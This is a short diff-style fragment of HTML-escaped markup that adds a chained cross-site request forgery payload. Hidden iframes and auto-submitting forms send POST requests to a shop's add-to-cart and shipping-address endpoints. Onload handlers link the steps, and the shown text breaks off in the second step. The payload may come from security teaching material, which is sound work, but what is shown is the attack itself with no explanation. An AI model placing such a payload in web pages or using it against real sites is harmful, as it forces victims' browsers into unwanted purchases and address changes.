@@ -1,0 +1,9 @@
+&lt;iframe name="step1" onload="step(2);"&gt;&lt;/iframe&gt;
+&lt;form method="POST" action="http://shop/add-to-cart" target="step1" name="frmStep1"&gt;
+	&lt;input type="text" name="item" value="943" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById("frmStep1").submit()</script>
+
+&lt;iframe name="step2" onload="step(3);"&gt;&lt;/iframe>
+&lt;form method="POST" action="http://shop/shipping-address" target="step2" name="frmStep2"&gt;
+&hellip;
